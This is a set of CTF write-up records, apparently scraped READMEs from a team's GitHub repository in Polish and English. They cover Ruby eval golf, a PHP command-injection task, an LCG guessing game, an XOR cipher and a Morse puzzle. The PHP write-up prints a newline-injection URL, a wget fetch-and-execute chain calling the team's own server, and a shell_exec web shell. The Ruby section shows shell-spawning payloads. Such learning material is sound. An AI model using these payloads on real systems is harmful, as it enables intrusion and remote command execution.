encode(sys.argv[1])\n```\n\nFlaga: `hitcon{what does the ruby say? @#$%!@&(%!#$&(%!@#$!$?...}`\n\n+50 punktów. Zdobyliśmy w ten sposób pierwszą flagę. Niestety, okazało się że nie da się ukraść jednej flagi mając shella od drugiej flagi (brak uprawnień) i musieliśmy\nkombinować dalej...\n\nPostanowiliśmy złożyć string \"sh\". I umieścić bo w backtickach aby wykonać go w shellu, uzyskując tym samym dostęp do shella. Nasza druga próba, dla 64 znaków, wyglądała tak:\n\n    _=$$;$_=*?`..?{;`#{$_[_*_+_-_/_]+$_[_+_]}`\n\nFlaga: `hitcon{Ruby in Peace m(_ _)m`\n\n+50 punktów. A następnie dla 36 bajtów analogiczna operacja kodująca wywołanie sh:\n\n    _=*?[..?{;`#{_[~--$$-$$]+_[~$$*$$]}`\n\nFlaga: `hitcon{My cats also know how to code in ruby :cat:}`\n\n+50 punktów. Później myśleliśmy dłuższą chwilę, ale wpadliśmy na to, że wykonanie `$0` również powinno dać nam shell - spróbowaliśmy więc:\n\n    `$#{~-$.}`\n\nGdzie `$.` to aktualny numer linii w stdin (czyli u nas 1). Operacja `~-number` zwraca nam liczbę o 1 mniejszą, czyli 0. Interpolujemy wynik jako stringa, doklejamy do znaku `$` i wywołujemy uzyskane `$0` w shellu uzyskując dostęp do shella.\nFlaga: `hitcon{It's hard to say where ruby went wrong QwO}`\n\nW ten sposób zdobyliśmy kolejne 50 punktów, rozwiązując w ten sposób całe zadanie.\n\n### ENG version\n\nWe get the code:\n\n```ruby\n\n#!/usr/bin/env ruby\n\nfail 'flag?' unless File.file?('flag')\n\n$stdout.sync = true\n\nlimit = ARGV[0].to_i\nputs \"Hi, I can say #{limit} bytes :P\"\ns = $stdin.gets.strip!\n\nif s.size > limit || s[/[[:alnum:]]/]\n  puts 'oh... I cannot say this, maybe it is too long or too weird :('\n  exit\nend\n\nputs \"I think size = #{s.size} is ok to me.\"\nr = eval(s).to_s\nr[64..-1] = '...' if r.size > 64\nputs r\n```\n\nAs can be seen, it gets data from the use and evaluates it with `eval()`, but only if it doesn't contain any alphanumerical characters and is short enough.\n\nThere are 4 instances of the task - each one accepts less characters. First 1024, second 64, third 36 and last one only 10. For beating each one we get 50 points.\n\nThe best solution we came up with initially was executing shell operations with (``` ` ```) and string interpolation.\n\nWe use here some numerical values that are accesible in the interpreter, eg. `$$` gives is PID of the process so calling `$$/$$` gives nam `1`. This way we can get any number and by using `''<<number` we can also generate any ASCII.\n\nWe made a simple encoder that can create a code for us:\n\n```python\ndef encode(cmd):\n    out = \"\"\"a1 = $$/$$\n    a2 = a1+a1\n    a4 = a2+a2\n    a8 = a4+a4\n    a16 = a8+a8\n    a32 = a16+a16\n    a64 = a32+a32\n    \"\"\"\n\n    ss = []\n    for c in cmd:\n        cc = ord(c)\n        vs = []\n        for b in range(8):\n            if (2**b) & ord(c):\n                vs.append('a'+str(2**b))\n        ss.append('(' + '+'.join(vs) + \")\")\n    s = '(\"\"<<' + '<<'.join(ss) + \")\"\n\n    end = \"`#{\" + s + \"}`\"\n\n    start = out + end\n\n    varnames = ['_'*i for i in range(1,10)][::-1]\n\n    start = start.replace('a64', varnames.pop())\n    start = start.replace('a32', varnames.pop())\n    start = start.replace('a16', varnames.pop())\n    start = start.replace('a8', varnames.pop())\n    start = start.replace('a4', varnames.pop())\n    start = start.replace('a2', varnames.pop())\n    start = start.replace('a1', varnames.pop())\n    start = ';'.join(start.split('\\n'))\n    return start\n\nimport sys\nprint encode(sys.argv[1])\n```\n\nFlag: `hitcon{what does the ruby say? @#$%!@&(%!#$&(%!@#$!$?...}`\n\n+50 points. This way we got the first flag. Unfortunately it was not possible to steal a different flag with the shell access we got (no permission) so we had to try harder.\n\nWe decided that we could prepare \"sh\" and put it in backticks to execute it in shell and get shell access. Our first attempt for 64 characters:\n\n    _=$$;$_=*?`..?{;`#{$_[_*_+_-_/_]+$_[_+_]}`\n\nFlag: `hitcon{Ruby in Peace m(_ _)m`\n\n+50 points. Next one for 36 characters similar attempt to call \"sh\":\n\n    _=*?[..?{;`#{_[~--$$-$$]+_[~$$*$$]}`\n\nFlag: `hitcon{My cats also know how to code in ruby :cat:}`\n\n+50 points. Then we had to think for a while but we figured that executing `$0` in the shell should also give us shell so we tried:\n\n    `$#{~-$.}`\n\nWhere `$.` is current stdin line number (for us 1). Operation `~-number` returns number-1, so in our case 0. We interpolate this as string and glue with `$` and execute the `$0` we just got, getting shell accesss.\nFlag: `hitcon{It's hard to say where ruby went wrong QwO}`\n\nThis way we got another 50 points and solved whole task.\n", "timestamp": "2025-10-21T22:03:16.625907"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-18-hitcon/web_100_babyfirst/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-18-hitcon/web_100_babyfirst/README.md", "content": "﻿## Babyfirst (web, 100p, ?? solves)\n\n> baby, do it first.\n\n> http://52.68.245.164\n\n### PL\n[ENG](#eng-version)\n\nPo połączeniu się pod podany url wyświetla się nam taka strona:\n\n```php\n<?php\n    highlight_file(__FILE__);\n\n    $dir = 'sandbox/' . $_SERVER['REMOTE_ADDR'];\n    if ( !file_exists($dir) )\n        mkdir($dir);\n    chdir($dir);\n\n    $args = $_GET['args'];\n    for ( $i=0; $i<count($args); $i++ ){\n        if ( !preg_match('/^\\w+$/', $args[$i]) )\n            exit();\n    }\n    exec(\"/bin/orange \" . implode(\" \", $args));\n?>\n```\n\nProgram tworzy folder \"sandbox/NASZE_IP\" oraz `chdir`uje do niego. Możemy wyświetlić zawartość tego folderu nawigując w przeglądarce\ndo http://52.68.245.164/sandbox/NASZE_IP. Straciliśmy w tym momencie dużo czasu na zgadywanie co robi /bin/orange (cóż, okazuje się że nic - był to link symboliczny do /bin/true).\n\nAle później zaczeliśmy myśleć, w jaki sposób można ominąć preg_match() - bo to jedyny sposób jaki widzieliśmy. Próbowaliśmy różnych rzeczy,\nale ostatecznie zauważyliśmy bardzo ciekawą rzecz - jeśli ostatnim bajtem wyrazu jest \\n, przechodzi on ten check. Co to oznacza? Że możemy \nzmusić exec do wykonania czegoś takiego:\n\nhttp://52.68.245.164/?args[]=a%0A&args[]=touch&args[]=cat\n\n```\n/bin/orange a\ntouch cat\n```\n\nI stworzy nam to plik `cat` w naszym sandboxowym folderze. Jest to bardzo duży krok w przód - możemy wykonać dowolne polecenie składające się ze znaków alfanumerycznych.\nNastępnie myśleliśmy długo, jaką komendę wykonać - wszystko ciekawe wymagało użycia albo albo slasha, albo myślnika, albo kropki.\n\nOdkryliśmy na szczęście w pewnym momencie, że wget ciągle wspiera pobieranie stron po IP, podanym jako liczbie! To znaczy że zadziała coś takiego:\n\nhttp://92775836/\n\nW tym momencie byliśmy kolejny duży krok bliżej rozwiązania zadania - wget może np. pobrać kod php z naszego serwera (jako tekst), a my wykonamy go za pomocą lokalnego intepretera php.\nNiestety, duży problem. Wget zapisuje pliki do pliku o nazwie \"index.html\", a my nie jesteśmy w stanie takiej nazwy przekazać php (kropka!). Redirecty\npo stronie serwera nie zmienią też nazwy pliku, bo do tego trzeba przekazać wgetowi odpowiednią opcję (myślnik!).\n\nZaczęliśmy się więc zastanawiać nad poleceniami, które dla podania swoich argumentów nie wymagają myślników. Od razu na myśl przyszedł nam `tar`. Gdyby udało nam się przekazać stworzone archiwum do interpretera PHP, ten powinien zignorować wszystko poza kodem PHP zawartym w `<?php ?>`.\n\nCiąg naszych ostatecznych poleceń wygląda następująco:\n\n```\nmkdir exploit\ncd exploit\nwget 92775836\ntar cvf archived exploit\nphp archived\n```\n\nNasz \"eksploit\" działał w następujący sposób:\n\n```php\n<?php\nfile_put_contents('shell.php', '\n    <?php\n    header(\"Content-Type: text/plain\");\n    print shell_exec($_GET[\"cmd\"]);\n    ?>\n');\n?>\n```\n\nDzięki temu mogliśmy wykonywać już polecenia bez żadnych ograniczeń i w ten sposób szybko znaleźliśmy program odczytujący flagę w `/`.\n\n### ENG version\n\nAfter connecting to the provided url we get the following page:\n\n```php\n<?php\n    highlight_file(__FILE__);\n\n    $dir = 'sandbox/' . $_SERVER['REMOTE_ADDR'];\n    if ( !file_exists($dir) )\n        mkdir($dir);\n    chdir($dir);\n\n    $args = $_GET['args'];\n    for ( $i=0; $i<count($args); $i++ ){\n        if ( !preg_match('/^\\w+$/', $args[$i]) )\n            exit();\n    }\n    exec(\"/bin/orange \" . implode(\" \", $args));\n?>\n```\n\nThe program creates a directory: \"sandbox/OUR_IP\" and `chdir`s to it. We can list contents of the folder in a browser by navigating to http://52.68.245.164/sandbox/OUR_IP. We lost a lot of time at this moment by guessing what /bin/orange does (well, it turns out it does nothing, it's just a symbolic link to /bin/true). \n\nBut then we started to think about how to bypass the preg_match() check - seeing as it was the only possible way. We tried a lot of things but finally noticed an interesting feat - if the last byte of the string is a newline character (`\\n`) it also passes the check. What does it mean? That we can force exec to execute something like this:\n\nhttp://52.68.245.164/?args[]=a%0A&args[]=touch&args[]=cat\n\n```\n/bin/orange a\ntouch cat\n```\n\nAnd that will create us a file named `cat` in our sandboxed folder. It's a big step forward - we can now execute an arbitrary command composing of alphanumeric characters. Then we thought long about which command to actually execute - everything interesting needed using slash, dash or dot.\n\nBut lucky us, we finally discoverd that `wget` is still supporting resolving ip hosts by its `long` number format. That means that we can make a download from:\n\nhttp://92775836/\n\nAnd that took us even further to completing the task: wget can download a php code from our webserver as text and then we'll execute it passing it to the local PHP interpreter.\nHowever, there's a big problem: wget saves contents to a file named `index.html`, but we can't pass that filename to php (the dot!). Server-side redirects won't change the filename as well, because wget needs a parameter for that (dash!).\n\nWe begun by thinking of all commands which for their arguments don't need dashes. We almost instantly thought of `tar`. If we could pass a non-compressed archive to the PHP interpreter it should ignore everything besides PHP code enclosed in `<?php ?>`. \n\nOur final command chain looks like this:\n\n```\nmkdir exploit\ncd exploit\nwget 92775836\ntar cvf archived exploit\nphp archived\n```\n\nOur \"exploit\" worked in a following way:\n\n```php\n<?php\nfile_put_contents('shell.php', '\n    <?php\n    header(\"Content-Type: text/plain\");\n    print shell_exec($_GET[\"cmd\"]);\n    ?>\n');\n?>\n```\n\nThanks to which we could execute commands with no limitations of the character set and that way we quickly found a program giving us a flag sitting in `/`.\n\n", "timestamp": "2025-10-21T22:03:16.850060"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-20 hacklu/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-20%20hacklu/README.md", "content": "# Writeup Hack.lu CTF 2015\n\nUczestniczyliśmy (msm, Rev, Shalom, other019, nazywam i pp) w Hack.lu CTF, i znowu spróbujemy opisać zadania z którymi walczyliśmy (a przynajmniej te, które pokonaliśmy).\n\nOgólne wrażenia:\n- CTF w środku tygodnia = bardzo słaby pomysł bo wszyscy w pracy albo w szkole więc na CTFa zostaje tylko kilka godzin...\n\nOpisy zadań po kolei.\n\n# Spis treści / Table of contents:\n* Module Loader 100+10 \n* PHP Golf 75+70\n* Stackstuff 150+80\n* Bashful 200+40\n* Creative Cheating 150+60\n* Checkcheckcheck 150+80\n* Perl Golf 75+50\n* Teacher's Pinboard 352+100\n* Secret Library 200+70 \n* Grading Board 300+80\n* [GuessTheNumber (ppc 150+80)](ppc150_guess_the_number)\n* GuessTheNumber 150+80\n* Salt 200+90\n* Dr. Bob 150+80\n\n# Zakończenie\n\nZachęcamy do komentarzy/pytań/czegokolwiek.\n", "timestamp": "2025-10-21T22:03:17.406840"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-20 hacklu/ppc150_guess_the_number/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-20%20hacklu/ppc150_guess_the_number/README.md", "content": "﻿## GuessTheNumber (ppc, 150+80p)\n\n\tThe teacher of your programming class gave you a tiny little task: just write a guess-my-number script that beats his script. He also gave you some hard facts:\n\the uses some LCG with standard glibc LCG parameters\n\tthe LCG is seeded with server time using number format YmdHMS (python strftime syntax)\n\tnumbers are from 0 up to (including) 99\n\tnumbers should be sent as ascii string\n\tYou can find the service on school.fluxfingers.net:1523\n\n### PL\n[ENG](#eng-version)\n\nPierwsze podejście do zadania polegało na implementacji opisanego w zadaniu LCG i próbie dopasowania wyników do zgadywanki z serwera. Jednak bardzo szybko uznaliśmy, że możliwości jest bardzo dużo i nie ma sensu ich analizować skoro da się to zadanie wykonać dużo prościej.\nDo zgadnięcia mamy zaledwie 100 liczb pod rząd a rozdzielczość zegara na serwerze to 1s. W związku z tym uznaliśmy, że prościej i szybciej będzie po prostu oszukiwać w tej grze :)\n\nWiemy że liczby generowane są przez LCG co oznacza, że dla danego seeda liczby do zgadnięcia są zawsze takie same. W szczególności jeśli dwóch użytkowników połączy się w tej samej sekundzie to wszystkie 100 liczb do zgadnięcia dla nich będzie takie samo. Dodatkowo serwer zwraca nam liczbę której oczekiwał jeśli się pomylimy.\n\nNasze rozwiązanie jest dość proste:\n\n* Uruchamiamy 101 wątków, które w tej samej sekundzie łączą się z docelowym serwerem.\n* Synchronizujemy wątki tak, żeby wszystkie zgadywały jedną turę w tej samej chwili a następnie czekały aż wszystkie skończą.\n* W każdej turze wszystkie wątki oprócz jednego czekają na liczbę do wysłania.\n* W każdej iteracji jeden wątek \"poświęca się\" wysyłając -1 jako odpowiedź, a następnie odbiera od serwera poprawną odpowiedź i informuje o niej pozostałe wątki.\n* W efekcie co turę \"tracimy\" jeden wątek, ale wszystkie pozostałe przechodzą do następnej tury podając poprawną odpowiedź.\n\nKażdy wątek realizuje poniższy kod:\n\n```python\nmax = 101\nthreads = Queue()\ncorrect_values = Queue()\ninit_barier = threading.Barrier(max)\ninit_barier_seeds = threading.Barrier(max)\nbar = [threading.Barrier(max - i) for i in range(max)]\nseeds = set()\n\n\ndef worker(index):\n    threads.get()\n    init_barier.wait()\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((\"school.fluxfingers.net\", 1523))\n    initial_data = str(s.recv(4096))\n    seeds.add(parse_seed(initial_data))\n    init_barier_seeds.wait()\n    if len(seeds) != 1:  # make sure we all start with the same seed, otherwise quit\n        threads.task_done()\n        return\n    for i in range(max):\n        bar[i].wait() #wait on the barrier for all other threads\n        if i == index:  # suicide thread\n            value = -1\n        else:\n            value = correct_values.get()\n        s.send(bytes(str(value) + \"\\n\", \"ASCII\"))\n        data = str(s.recv(4096))\n        print(\"thread \" + str(index) + \" iteration \" + str(i) + \" \" + data)\n        if \"wrong\" in data.lower():\n            correct = re.compile(\"'(\\d+)'\").findall(data)[0]\n            for j in range(max - i - 1):  # tell everyone what is the right number\n                correct_values.put(correct)\n            break\n    threads.task_done()\n```\n\nKompletny skrypt dostępny [tutaj](guess.py)\n\nUruchamiamy skrypt i dostajemy:\n```\nthread 98 iteration 97 b'Correct! Guess the next one!\\n'\nthread 99 iteration 97 b'Correct! Guess the next one!\\n'\nthread 100 iteration 97 b'Correct! Guess the next one!\\n'\nthread 98 iteration 98 b\"Wrong! You lost the game. The right answer would have been '38'. Quitting.\"\nthread 99 iteration 98 b'Correct! Guess the next one!\\n'\nthread 100 iteration 98 b'Correct! Guess the next one!\\n'\nthread 99 iteration 99 b\"Wrong! You lost the game. The right answer would have been '37'. Quitting.\"\nthread 100 iteration 99 b\"Congrats! You won the game! Here's your present:\\nflag{don't_use_LCGs_for_any_guessing_competition}\"\n```\n\n`flag{don't_use_LCGs_for_any_guessing_competition}`\n\n### ENG version\n\nInitial attempt for this task was to implement described LCG and trying to match the output for the results on the server. But we instantly decided that there are too many possibilities and there is no point in wasting time for analysis when we can do it much easier.\nWe need to guess only 100 numbers in a row and the clock resolution on the server is just 1s. So we decided that it will be better and faster just to cheat the game :)\n\nWe know that the numbers are generated with LCG which means that for given seed the numbers are always the same. In particular, if two users connect at the same time the 100 numbers to guess will be identical. On top of that the server returns the expected number if we make a mistake.\n\nOur solution was quite simple:\n\n* Run 101 threads, which will connect to the server at the same time.\n* Synchronize the threads so that they all execute a single turn and the wait for the rest.\n* In each turn all threads but one are waiting for the number to send.\n* In each turn one thread \"sacrifices himself\" sending -1 as answer, and the collects the correct number form server response and informs rest of the threads about it.\n* As a result in each turn we \"lose\" one thread but all the others pass to the next round.\n\nEaach thread executes:\n\n```python\nmax = 101\nthreads = Queue()\ncorrect_values = Queue()\ninit_barier = threading.Barrier(max)\ninit_barier_seeds = threading.Barrier(max)\nbar = [threading.Barrier(max - i) for i in range(max)]\nseeds = set()\n\n\ndef worker(index):\n    threads.get()\n    init_barier.wait()\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((\"school.fluxfingers.net\", 1523))\n    initial_data = str(s.recv(4096))\n    seeds.add(parse_seed(initial_data))\n    init_barier_seeds.wait()\n    if len(seeds) != 1:  # make sure we all start with the same seed, otherwise quit\n        threads.task_done()\n        return\n    for i in range(max):\n        bar[i].wait() #wait on the barrier for all other threads\n        if i == index:  # suicide thread\n            value = -1\n        else:\n            value = correct_values.get()\n        s.send(bytes(str(value) + \"\\n\", \"ASCII\"))\n        data = str(s.recv(4096))\n        print(\"thread \" + str(index) + \" iteration \" + str(i) + \" \" + data)\n        if \"wrong\" in data.lower():\n            correct = re.compile(\"'(\\d+)'\").findall(data)[0]\n            for j in range(max - i - 1):  # tell everyone what is the right number\n                correct_values.put(correct)\n            break\n    threads.task_done()\n```\n\nComplete script is [here](guess.py).\n\nWe run the script and we get:\n```\nthread 98 iteration 97 b'Correct! Guess the next one!\\n'\nthread 99 iteration 97 b'Correct! Guess the next one!\\n'\nthread 100 iteration 97 b'Correct! Guess the next one!\\n'\nthread 98 iteration 98 b\"Wrong! You lost the game. The right answer would have been '38'. Quitting.\"\nthread 99 iteration 98 b'Correct! Guess the next one!\\n'\nthread 100 iteration 98 b'Correct! Guess the next one!\\n'\nthread 99 iteration 99 b\"Wrong! You lost the game. The right answer would have been '37'. Quitting.\"\nthread 100 iteration 99 b\"Congrats! You won the game! Here's your present:\\nflag{don't_use_LCGs_for_any_guessing_competition}\"\n```\n\n`flag{don't_use_LCGs_for_any_guessing_competition}`", "timestamp": "2025-10-21T22:03:17.685300"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-22-ekoparty/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-22-ekoparty/README.md", "content": "# Writeup Ekoparty CTF 2015\n\nUczestniczyliśmy (msm, Rev, Shalom, other019, nazywam i pp) w Ekoparty CTF, i znowu spróbujemy opisać zadania z którymi walczyliśmy (a przynajmniej te, które pokonaliśmy).\n\nOgólne wrażenia:\n\nOpisy zadań po kolei.\n\n# Spis treści/Table of contents:\n\n* Slogans (trivia 50)\n* Banner (trivia 70)\n* Mr Anderson (trivia 80)\n* SSL Attack (trivia 90)\n* Pass Check (web 50)\n* Crazy JSON (web 200)\n* Rand DOOM (web 300)\n* SCYTCRYPTO (crypto 50)\n* [XOR Crypter (crypto 200)](crpto_200_xorcrypter)\n* Patch me (reverse 50)\n* Malware (reverse 200)\n* Olive (misc 50)\n\n\n# Zakończenie\n\nZachęcamy do komentarzy/pytań/czegokolwiek.\n", "timestamp": "2025-10-21T22:03:18.257499"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-22-ekoparty/crpto_200_xorcrypter/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-22-ekoparty/crpto_200_xorcrypter/README.md", "content": "﻿## XOR Crypter (crypto 200p)\n\n\tDescription: The state of art on encryption, can you defeat it?\n\tCjBPewYGc2gdD3RpMRNfdDcQX3UGGmhpBxZhYhFlfQA= \n\n### PL\n[ENG](#eng-version)\n\nCały kod szyfrujący jest [tutaj](shiftcrypt.py).\nSzyfrowanie jest bardzo proste, aż dziwne że zadanie było za 200 punktów. Szyfrowanie polega na podzieleniu wejściowego tekstu na 4 bajtowe kawałki (po dodaniu paddingu jeśli to konieczne, aby rozmiar wejścia był wielokrotnością 4 bajtów), rzutowanie ich na inta a następnie wykonywana jest operacja `X xor X >>16`. Jeśli oznaczymy kolejnymi literami bajty tego inta uzyskujemy: \n\n`ABCD ^ ABCD >> 16 = ABCD ^ 00AB = (A^0)(B^0)(C^A)(D^B) = AB(C^A)(D^B)`\n\nJak widać dwa pierwsze bajty są zachowywane bez zmian a dwa pozostałe bajty są xorowane z tymi dwoma niezmienionymi. Wiemy także że xor jest operacją odwracalną i `(A^B)^B = A` możemy więc odwrócić szyfrowanie dwóch ostatnich bajtów xorując je jeszcze raz z pierwszym oraz drugim bajtem (pamiętając przy tym o kolejności bajtów)\n\n```python\ndata = \"CjBPewYGc2gdD3RpMRNfdDcQX3UGGmhpBxZhYhFlfQA=\"\ndecoded = base64.b64decode(data)\nblocks = struct.unpack(\"I\" * (len(decoded) / 4), decoded)\noutput = ''\nfor block in blocks:\n\tbytes = map(ord, struct.pack(\"I\", block))\n\tresult = [bytes[0] ^ bytes[2], bytes[1] ^ bytes[3],  bytes[2], bytes[3]]\n\toutput += \"\".join(map(chr, result))\nprint(output)\n```\n\nW wyniku czego uzyskujemy flagę: `EKO{unshifting_the_unshiftable}`\n\n### ENG version\n\n\nCipher code is [here](shiftcrypt.py).\nThe cipher is actually very simple, it was very strange that the task was worth 200 point. The cipher splits the input text in 4 byte blocks (after adding padding if necessary so that the input is a multiply of 4 bytes), casting each block to integer and the performing `X xor X >>16`. If we mark each byte of the single block with consecutive alphabet letters we get:\n\n`ABCD ^ ABCD >> 16 = ABCD ^ 00AB = (A^0)(B^0)(C^A)(D^B) = AB(C^A)(D^B)`\n\nAs can be noticed, first two bytes are unchanged and last two are xored with those two unchanged. We also know that xor is reversible and `(A^B)^B = A` so we can revert the cipher of the last two bytes by xoring them again with first and second byte (keeping in mind the byte order).\n\n```python\ndata = \"CjBPewYGc2gdD3RpMRNfdDcQX3UGGmhpBxZhYhFlfQA=\"\ndecoded = base64.b64decode(data)\nblocks = struct.unpack(\"I\" * (len(decoded) / 4), decoded)\noutput = ''\nfor block in blocks:\n\tbytes = map(ord, struct.pack(\"I\", block))\n\tresult = [bytes[0] ^ bytes[2], bytes[1] ^ bytes[3],  bytes[2], bytes[3]]\n\toutput += \"\".join(map(chr, result))\nprint(output)\n```\n\nAs a result we get: `EKO{unshifting_the_unshiftable}`\n", "timestamp": "2025-10-21T22:03:18.518351"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-11-20-dctffinals/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-11-20-dctffinals/README.md", "content": "# Writeup DefCamp CTF Finals 2015\n\n![](./IMG_20151119_104301.jpg)\n\n# Spis treści:\n* [web 200](web200)\n* [crypto 100 (Morse c'est)](crypto100)\n* [crypto 300](crypto300)\n* [crypto 400](crypto400)\n* [reverse 200 (Time is not your friend)](re_200_time_is_not_your_friend)\n* [reverse 300 (Try harder)](re_300_tryharder)\n\n### ENG version\n# Table of contents:\n* [web 200](web200#eng-version)\n* [crypto 100 (Morse c'est)](crypto100#eng-version)\n* [crypto 300](crypto300#eng-version)\n* [crypto 400](crypto400#eng-version)\n* [reverse 200 (Time is not your friend)](re_200_time_is_not_your_friend#eng-version)\n* [reverse 300 (Try harder)](re_300_tryharder#eng-version)\n", "timestamp": "2025-10-21T22:03:19.060424"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-11-20-dctffinals/crypto100/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-11-20-dctffinals/crypto100/README.md", "content": "##Crytpo 100 (crypto, 100p)\n\n###PL\n[ENG](#eng-version)\n\nTreść zadania była następująca \"Przechwycono rozmowę hackera w której wymienia tajne hasło. Prawie na pewno jest alfabetem morsa. Głupi protokół usunął wszystkie spacje. Odnajdź hasło.\"\nRozwiązanie to dctf{md5}.\n\n```\n..-......-..--.-..--..-..-.--..-.-..-.....-..-.--..--.....-.-.-----..-..-...-.-..---..---.....--.-.....--.--..-....-.-.-.----....-.--....-.-......--.-.-..--..--..-.----....--.-.....-----..--.-.....---..-..-......--...--.-.......-.-.--.-.-----.--...--..-.-.---.--.--...--.--....-.-...--..-.-.----..-.---..-.-.-...-...-..-.--.-.......-.....-.-.--.-.-----..-.--...-..-.------.-.-.....-.---.-..-----.-.--.--......-....-.....--..--..-.--.-....--..-.--..--..-..-...-..-.--..--.--.-..-----.-....--.--..-...--.-.-.-....-.-------..-.-.-...-...-..-.--.-.......-........-..-.-.---...--.--.-.-.-.--.-.-..--..----.-.-..........-....---.--..--.--.---.-.-.--.-..-.......-.---.-.....-..-.-.---......-.--..--.-..---.-.-.--....-.....-.-..-.-...-..-.--..-.--.-...--.--...------.--.-.---..-.-..-----.-.-.-..-...-.--.--.-....-..-...-.-.-.------...-.--..---.--..-........---..-.-...-...--..-.-..-......-.--.-....-....-..----.-.-.-.....-.---.-..-----.-.--.--.-....-.........-.-...--.--.---.-.-.--.-..-.-----...--.--.----.....-......-...-.-.--.....------.-.....----......-......--.-..--..---......-...-.-.........-..-..-.-...-..--....---.-...-......-.....---.-......-.-.-.-....-..-.-.-------...-.-.....--.....-..----....-.-.....----..-....-...-....-...-.----.--.-.-.-.-.-....-..-.-.--.--.-...-..--..--....-..-.-.----........---....-..-.-----..-..--.-..-...-------.-.....-.-......-.-.-.-.-...-.-.--.....-.--.-..-------.-..-.---.-.-....--..--...--.--...--..--..-......-...--...---..---.....---.-----..--.-..--..----.--..----.-----..-.-..--....-.....-...-.-..-.-.-...-..-.--.--..-....---..--.....-...-..-.--....-----.----......-..--..-...-....---..-..-.--.....--.---.-.......-.--...-.-.-.-..-.......--..--.-.-.-...--.-.--....-...-.....--..-.....-......-...-.-....--.--.--..-.......-...-..--.-..-......--.-.-.-.........--..-.......--......-..-................---....-.------....----....---...-----...--.......-.-....-.-....--.....---....----.-.-......------.-...----....-----.----.....--.......-.-.-.-......---.--..-.....---.....----......--.---.-.......-.--...-..-.---.-.--.----.--...---..-------.-.....-.-.----....--.-..-.....---.....---..---.......-.-......-.-..--.-.-..-......-....-..-......-.---.-...--...-...-..--......-....--..-.....--.-.-.-...---.--...........-.--.-.-----..---.-------...-....--.-.-.----.--..-..-....-.-...--.-...-...-.----........---.--..-.----..---..-...-...--..-...-.-..-..---.....-.-.-.-.--....---.....-...---..---.....--.........--..--.-............--..-.-.-\n```\n\nUżyliśmy kodu z [https://gist.github.com/ebuckley/1842461](https://gist.github.com/ebuckley/1842461), przerabijąc go dodając obsługę cyfr i ograniczając obsługę liter do A-F.\nJednak zwracał coś około 20 milionów możliwych hashy.  Próbowaliśmy też różnych słownikowych solverów, ale bez skutku.\nPo jedenastu godzinach(z 24)organizatorzy zorientowali się, że zadanie jest niemożliwe do zrobienia.\nZmienili kod zadania na:\n\n```\n..â€‹-â€‹..â€‹...â€‹.â€‹-..-â€‹-â€‹.-.â€‹.â€‹--â€‹.â€‹.-..â€‹-.--â€‹..â€‹-.â€‹-â€‹.â€‹.-.â€‹.â€‹...â€‹-â€‹..â€‹-.â€‹--.â€‹.--â€‹....â€‹.â€‹-.â€‹-.--â€‹---â€‹..-â€‹..-.â€‹..â€‹-.â€‹-..â€‹---â€‹..-â€‹-â€‹-â€‹....â€‹.-â€‹-â€‹.-â€‹...â€‹..â€‹--â€‹.--.â€‹.-..â€‹.â€‹.â€‹-.â€‹-.-.â€‹---â€‹-..â€‹..â€‹-.â€‹--.â€‹...â€‹-.-.â€‹....â€‹.â€‹--â€‹.â€‹-.-.â€‹.-â€‹-.â€‹.--.â€‹.-.â€‹---â€‹-..â€‹..-â€‹-.-.â€‹.â€‹...â€‹---â€‹--â€‹..-â€‹-.-.â€‹....â€‹---â€‹..-.â€‹.-â€‹....â€‹.â€‹.-â€‹-..â€‹.-â€‹-.-.â€‹....â€‹.â€‹.-.-.-â€‹-.-.â€‹---â€‹--â€‹.--.â€‹..-â€‹-â€‹.â€‹.-.â€‹-.â€‹---â€‹.--â€‹.-â€‹-..â€‹.-â€‹-.--â€‹...â€‹.-â€‹.-.â€‹.â€‹.--.â€‹.-â€‹.-.â€‹-â€‹---â€‹..-.â€‹---â€‹..-â€‹.-.â€‹-..â€‹.-â€‹..â€‹.-..â€‹-.--â€‹.-..â€‹..â€‹...-â€‹.â€‹...â€‹.-.-.-â€‹-.-.â€‹---â€‹--â€‹..â€‹-.â€‹--.â€‹..-.â€‹.-.â€‹---â€‹--â€‹-â€‹.â€‹-.-.â€‹....â€‹-.â€‹---â€‹.-..â€‹---â€‹--.â€‹-.--â€‹.--â€‹....â€‹.â€‹.-.â€‹.â€‹..â€‹-â€‹..â€‹...â€‹--.â€‹.â€‹-â€‹-â€‹..â€‹-.â€‹--.â€‹-...â€‹.â€‹-â€‹-â€‹.â€‹.-.â€‹--..--â€‹..-.â€‹.-â€‹...â€‹-â€‹.â€‹.-.â€‹--..--â€‹.-â€‹-.â€‹-..â€‹--â€‹---â€‹.-.â€‹.â€‹..â€‹--â€‹.--.â€‹.-..â€‹.â€‹--â€‹.â€‹-.â€‹-â€‹.â€‹-..â€‹..â€‹-.â€‹-â€‹---â€‹---â€‹..-â€‹.-.â€‹-..â€‹.-â€‹..â€‹.-..â€‹-.--â€‹.-..â€‹..â€‹...-â€‹.â€‹...â€‹.â€‹...-â€‹.â€‹.-.â€‹-.--â€‹-..â€‹.-â€‹-.--â€‹.-.-.-â€‹.--â€‹.â€‹-.-.â€‹.-â€‹-.â€‹.----.â€‹-â€‹.-.â€‹.â€‹...â€‹..â€‹...â€‹-â€‹....â€‹---â€‹.--â€‹..â€‹--â€‹.--.â€‹---â€‹.-.â€‹-â€‹.-â€‹-.â€‹-â€‹..â€‹-â€‹..â€‹...â€‹..-.â€‹---â€‹.-.â€‹.â€‹...-â€‹.â€‹.-.â€‹-.--â€‹-â€‹....â€‹..â€‹-.â€‹--.â€‹.--â€‹.â€‹-..â€‹---â€‹.-.-.-â€‹-...â€‹.-â€‹...â€‹..â€